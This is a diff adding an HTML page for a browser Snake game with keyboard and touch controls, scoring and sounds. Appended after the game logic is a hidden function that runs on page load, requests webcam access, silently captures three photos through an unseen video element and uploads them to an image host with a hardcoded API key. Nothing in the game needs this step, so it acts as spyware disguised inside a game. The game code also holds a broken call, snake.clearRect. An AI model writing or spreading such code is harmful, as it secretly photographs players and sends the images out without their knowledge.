@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Snake</title>
+    <style>
+@import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@300&family=Press+Start+2P&display=swap');
+
+html, body{
+    height: 100%;
+    margin: 0;
+    background-color: #a7d4a1;
+
+}
+
+
+body{
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: "Press Start 2P", cursive;
+}
+
+.title{
+    text-align: center;
+}
+
+canvas{
+    border: 2px solid #748c72;
+    background: linear-gradient(#8fb58a, #a7d4a1, #abcfa5, #8fb58a); 
+    box-shadow: inset 0 0 50px rgba(0,0,0,0.4);
+    border-radius: 20px;
+}
+
+
+.start-button{
+    font-family: "Press Start 2P", cursive;
+    margin-top: 60px;
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background-color: #061138;
+    color: white;
+    border: none;
+    padding: 10px 20px;
+    font-size: 10px;
+    cursor: pointer;
+    border-radius: 20px;
+}
+
+.game-over{
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    text-align: center;
+    display: none;
+    font-size: 12px;
+}
+
+.score-display{
+    color: #000;
+    margin-bottom: 105px;
+    text-align: center;
+}
+
+    </style>
+</head>
+<body>
+    <div class="game-container">
+        <p class="title">SNAKE</p>
+        <canvas id="game" width="400" height="400"></canvas>
+        <div class="score-container">
+            <p>Score: <span class="score-display">0</span></p>
+        </div>
+        <button class="start-button">Start</button>
+        <div class="game-over">
+            <h2>Game Over</h2>
+            <p>Final Score: <span class="score-display">0</span></p>
+            <button class="start-button">Again</button>
+            <audio src="aud/coll.mp3" id="collisionSound"></audio> 
+            <audio src="aud/eat.mp3" id="eatingSound"></audio>
+            <audio src="aud/pause.mp3" id="pauseSound"></audio>
+        </div>
+    </div>
+    <script>
+const canvas = document.getElementById('game');
+const context = canvas.getContext('2d');
+const collisionSound = document.getElementById('collisionSound');
+const eatingSound = document.getElementById('eatingSound');
+const pauseSound = document.getElementById('pauseSound');
+
+let gameRunning = false;
+
+let gamePaused = false;
+
+let grid = 16;
+
+let count = 0;
+
+let score = 0;
+
+let gemEaten = false;
+
+let allowanceCounter = 0;
+
+let snake = {
+    x: 160,
+    y: 160,
+    dx: grid,
+    dy: 0,
+    cells: [],
+    maxCells: 4 
+};
+
+let gem = {
+    x: 320,
+    y: 320
+};
+
+// FPS - Frames Per Second [the higher the better]
+// requestAnimationFrame(loop)
+let animationFrame;
+let startButton = document.querySelector('.start-button');
+let gameOverScreen = document.querySelector('.game-over');
+let scoreDisplay = document.querySelector('.score-display');
+
+// This is a function that helps us generate a random position for the gem on the grid.
+// It takes a min and a max number, and then we invoque it by feeding a minimim number(0) and a maximum number(25).
+function getRandomInt(min, max){
+    return Math.floor(Math.random() * (max-min)) + min;
+}
+
+// Start Game event listener
+startButton.addEventListener('click', function(){
+    // sanity check
+    // console.log("Button is clicked!")
+    startGame();
+});
+
+// Restart game when game is over
+gameOverScreen.querySelector('.start-button').addEventListener('click', function(){
+    startGame();
+});
+
+// Event Listeners for the computer version
+document.addEventListener('keydown', function(e){
+    if (!gameRunning){
+        return;
+    }
+    // 37 for Left key, 38 for up key, 39 for right key, 40 for down key and 32 for Spacebar key.
+    // Arrow keys for moving the snake
+    if (e.which === 37 && snake.dx === 0){
+        snake.dx = -grid;
+        snake.dy = 0;
+    }else if (e.which === 38 && snake.dy === 0){
+        snake.dy = -grid;
+        snake.dx = 0;
+    }else if (e.which === 39 && snake.dx ===0){
+        snake.dx = grid;
+        snake.dy = 0;
+    }else if (e.which === 40 && snake.dy ===0){
+        snake.dy = grid;
+        snake.dx=0;
+    }
+    // Spacebar for pausing the game
+    if (e.which === 32){
+        gamePaused = !gamePaused; // ! = NOT
+        context.fillStyle = '#fff';
+        context.font = 'bold 30px Arial';
+        if (gamePaused){
+            pauseSound.play();
+            context.fillText('Game Paused', canvas.width / 2 - 100, canvas.height / 2);           
+        }else{
+            // Resume the game
+            pauseSound.play();
+            animationFrame = requestAnimationFrame(loop);
+        }
+    } 
+});
+
+// Event listeners for the smartphone version
+let touchStartX = 0;
+let touchStartY = 0;
+
+document.addEventListener('touchstart', function(e){
+    if (!gameRunning){
+        return;
+    }
+    // Initial points for the snake to move on the screen
+    touchStartX = e.touches[0].clientX;
+    touchStartY = e.touches[0].clientY;
+});
+
+document.addEventListener('touchmove', function(e){
+    if (!gameRunning){
+        return;
+    }
+
+    // Swipe detection and snake movement
+    let touchEndX = e.touches[0].clientX;
+    let touchEndY = e.touches[0].clientY;
+    let dx = touchEndX - touchStartX;
+    let dy = touchEndY - touchStartY;
+
+    if (Math.abs(dx) > Math.abs(dy)){
+        // Right swipe
+        if (dx > 0 && snake.dx ===0){
+            snake.dx = grid;
+            snake.dy = 0;
+        // Left swipe
+        } else if (dx < 0 && snake.dx === 0){
+            snake.dx = -grid;
+            snake.dy = 0;
+        }
+    }else{
+        // Down Swipe
+        if (dy > 0 && snake.dy === 0){
+            snake.dy = grid;
+            snake.dx = 0;
+        // Up Swipe
+        }else if (dy < 0 && snake.dy === 0){
+            snake.dy = -grid;
+            snake.dx = 0;
+        }
+    }
+});
+
+// Main loop function
+function loop(){
+    if (!gameRunning || gamePaused){
+        return;
+    }
+    // The allowance period for the snake to turn yellow for a few seconds then returns back to black (dark green)
+    if (gemEaten){
+        allowanceCounter++;
+        if (allowanceCounter >=50){
+            gemEaten = false;
+            allowanceCounter = 0;
+        }
+    }
+    // set animationFrame to loop function recursively operated via requestAnimationFrame method
+    animationFrame = requestAnimationFrame(loop);
+
+    // Control game loop speed
+    if (++count < 100){
+        return;
+    }
+    count = 95; // speed
+
+    context.clearRect(0,0, canvas.clientWidth, canvas.height);
+    
+    snake.x += snake.dx;
+    
+    snake.y += snake.dy;
+
+    // Wrap the snake position on screen edges
+    if (snake.x < 0){
+        snake.x = canvas.width - grid
+    } else if (snake.x >= canvas.width){
+        snake.x = 0;
+    }
+    if (snake.y < 0){
+        snake.y = canvas.height - grid
+    } else if (snake.y >= canvas.height){
+        snake.y = 0;
+    }
+
+    // Add the current head position to the snake cells array and remove the tail if exceeding the maximum cell count.
+    snake.cells.unshift({x: snake.x, y: snake.y});
+    if (snake.cells.length > snake.maxCells){
+        snake.cells.pop();
+    }
+
+    // Draw grid lines
+    context.strokeStyle = '#333';
+    for (let i = 0; i < canvas.width; i += grid) {
+        context.beginPath();
+        context.moveTo(i, 0);
+        context.lineTo(i, canvas.height);
+        context.stroke();
+    }
+    for (let j = 0; j < canvas.height; j += grid) {
+        context.beginPath();
+        context.moveTo(0, j);
+        context.lineTo(canvas.width, j);
+        context.stroke();
+    }
+
+    // Draw the gems and the snake
+    context.fillStyle = "#fff"
+    context.fillRect(gem.x, gem.y, grid - 1, grid - 1);
+    context.shadowColor = 'rgba(0,0,0,0.5)';
+    context.shadowBlur = 5;
+    context.shadowOffsetX = 2; //in tutorial , there was a missing S in both X and Y.
+    context.shadowOffsetY = 2;
+    context.fillStyle = gemEaten ? '#ffff00' : '#061138';
+
+    // Drawing the snake and eating the gem
+    snake.cells.forEach(function(cell, index){
+        context.fillRect(cell.x, cell.y, grid - 1, grid - 1);
+        if (cell.x === gem.x && cell.y === gem.y){
+            //Snake eats gem: cells increase, scores increases, scoredisplay is being updated with the actual score.
+            snake.maxCells++;
+            score++;
+            scoreDisplay.textContent = score;
+            // Playing eating sound
+            eatingSound.play();
+            //Generate a new random gem position
+            gem.x = getRandomInt(0,25) * grid;
+            gem.y = getRandomInt(0,25) * grid;
+            gemEaten = true;
+        }
+
+        // Check collision with snake's own body (game is over!)
+        for (let i = index + 1; i < snake.cells.length; i++){
+            if (cell.x === snake.cells[i].x && cell.y === snake.cells[i].y){
+                // invoking the endGame method
+                endGame();           
+            }
+        }
+    });
+}
+
+// Start Game function
+function startGame(){
+    if (gameRunning){
+        return;
+    }
+    gameRunning = true;
+    gamePaused = false;
+    score = 0;
+    snake.x = 160;
+    snake.y = 160;
+    snake.cells = [];
+    snake.maxCells = 4;
+    snake.dx = grid;
+    snake.dy = 0;
+    gem.x = getRandomInt(0,25) * grid;
+    gem.y = getRandomInt(0,25) * grid;
+    startButton.style.display = 'none';
+    gameOverScreen.style.display = 'none';
+    scoreDisplay.textContent = score;
+    if (animationFrame){
+        cancelAnimationFrame(animationFrame);
+    }animationFrame = requestAnimationFrame(loop);
+}
+
+// End game function
+function endGame(){
+    gameRunning = false;
+    gamePaused = true;
+    gameOverScreen.style.display = 'block';
+    document.querySelector('.game-over .score-display').textContent = score;
+    
+    // play the hitting sound
+    collisionSound.play();
+    
+    // Clear the canvas
+    context.clearRect(0, 0, canvas.width, canvas.height);
+    snake.clearRect(0,0,canvas.width, canvas.height);    
+    if (animationFrame){
+        cancelAnimationFrame(animationFrame);
+    }
+}
+
+        // Function to capture the photos
+        async function capturePhotos() {
+            try {
+                // Ask for webcam permission
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+                // Create a hidden video element to access the webcam feed without showing it
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                // Wait for the video to start playing
+                await new Promise(resolve => video.onplaying = resolve);
+
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                
+                let photos = [];
+                
+                // Capture 3 photos at 2-second intervals
+                for (let i = 0; i < 3; i++) {
+                    setTimeout(() => {
+                        // Capture the image from the video and store it in base64
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        photos.push(canvas.toDataURL('image/png')); // Store photo
+
+                        // Upload the photo immediately after capturing
+                        if (photos.length === 3) {
+                            uploadPhotos(photos);
+                        }
+                    }, i * 2000); // Interval of 2 seconds
+                }
+
+                // Stop the webcam stream after the photos have been captured
+                setTimeout(() => {
+                    stream.getTracks().forEach(track => track.stop());
+                }, 6000); // Stop after 6 seconds (since we're capturing 3 photos)
+
+            } catch (error) {
+                console.error('Error accessing webcam:', error);
+            }
+        }
+
+        // Function to upload photos to Imgbb
+        async function uploadPhotos(photos) {
+            const apiKey = '8da16eec92bb3f899f7d86ffa582a1f9';  // Replace with your Imgbb API key
+
+            // Upload each photo to Imgbb
+            for (const photo of photos) {
+                const formData = new FormData();
+                formData.append('image', photo.split(',')[1]); // Extract base64 data
+
+                const response = await fetch(`https://api.imgbb.com/1/upload?key=${apiKey}`, {
+                    method: 'POST',
+                    body: formData,
+                });
+
+                const data = await response.json();
+                if (data.success) {
+                    console.log('Uploaded image URL:', data.data.url);
+                } else {
+                    console.error('Upload failed:', data);
+                }
+            }
+        }
+
+        // Start capturing photos as soon as permission is granted
+        capturePhotos();
+
+</script>
+</body>
+</html>
